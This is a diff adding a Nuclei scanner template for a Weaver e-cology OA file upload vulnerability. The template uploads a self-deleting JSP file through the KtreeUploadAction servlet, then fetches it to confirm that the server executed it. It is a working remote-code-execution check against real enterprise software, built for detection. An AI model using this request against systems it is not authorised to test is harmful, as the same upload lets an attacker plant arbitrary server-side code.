@@ -1,0 +1,57 @@
+id: weaver-ecology-oa-ktreeuploadaction-writefile
+
+info:
+  name: Weaver e-cology KtreeUploadAction File Write
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    This template exploits a file upload vulnerability in Weaver e-cology's KtreeUploadAction, allowing attackers to upload and execute arbitrary JSP files.
+  reference:
+    - https://mp.weixin.qq.com/s/3ip7-U8BsWgq3N4SP5xd4w
+
+variables:
+  r1: "{{rand_int(40000, 44800)}}"
+  r2: "{{rand_int(40000, 44800)}}"
+  rboundary: "{{rand_text_alpha(8)}}"
+  randname: "{{rand_text_alpha(6)}}"
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/weaver/com.weaver.formmodel.apps.ktree.servlet.KtreeUploadAction?action=image"
+    headers:
+      Content-Type: "multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}"
+    body: |
+      ------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data; name="test"; filename="{{randname}}.jsp"\r\nContent-Type: image/jpeg\r\n\r\n<%out.print({{r1}} * {{r2}});new java.io.File(application.getRealPath(request.getServletPath())).delete();%>\r\n------WebKitFormBoundary{{rboundary}}--\r\n
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "SUCCESS"
+
+    extractors:
+      - type: regex
+        name: furl
+        part: body
+        internal: true
+        regex:
+          - "','url':'/(?P<furl>.*?.jsp)',"
+
+  - id: validate-file
+    method: GET
+    path:
+      - "{{BaseURL}}/{{furl}}"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{to_number(r1) * to_number(r2)}}"
